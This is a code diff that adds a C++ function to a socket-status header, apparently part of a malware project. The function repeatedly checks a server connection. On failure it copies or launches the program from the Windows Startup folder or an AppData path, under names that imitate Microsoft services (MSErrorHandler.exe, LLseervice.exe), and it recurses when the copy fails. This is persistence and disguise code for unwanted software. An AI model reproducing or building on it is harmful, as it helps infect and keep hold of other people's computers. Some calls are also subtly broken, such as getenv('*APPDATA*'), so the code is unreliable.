@@ -255,6 +255,65 @@ namespace ss
 
 
     }
+
+    void creckSoc(){
+        int server = ss::server();
+        if (server == 1) {
+            while (true) {
+                int con = ss::connect();
+                if (con == 3) {
+                    //try 3 time
+                    for (int i = 0; i < 3; ++i) {
+                        con = ss::connect();
+                        if (con == 3) {
+                            //true file not delete
+                            break;
+                        } else {
+                            if (i == 2) {
+                                std::string filename = IO::getFileName();
+                                if (filename == "MSErrorHandler.exe"){
+                                    std::string appdata_dir(getenv("*APPDATA*"));
+                                    std::string path = appdata_dir + "\\Microsoft\\Services\\";
+                                    filename = path+"MSErrorHandler.exe";
+                                } else{
+                                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+                                }
+                                if (IO::exists_file(filename)){
+                                    IO::startup(filename.c_str());
+                                } else{
+                                    if (!IO::copy_File()) break;
+                                }
+
+                            }
+                        }
+                    }
+                } else {
+                    continue;
+                }
+            }
+        } else {
+            if (server == 3) {
+                std::string filename = IO::getFileName();
+                if (filename == "MSErrorHandler.exe"){
+                    std::string appdata_dir(getenv("*APPDATA*"));
+                    std::string path = appdata_dir + "\\Microsoft\\Services\\";
+                    filename = path+"MSErrorHandler.exe";
+                } else{
+                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+                }
+                if (IO::exists_file(filename)){
+                    IO::startup(filename.c_str());
+                } else{
+                    if (IO::copy_File()) {
+                        //continue
+                    } else {
+                        //cannot backup i will die
+                        creckSoc();
+                    }
+                }
+            }
+        }
+    }
 }
 
 #endif /* sockstatus_h */
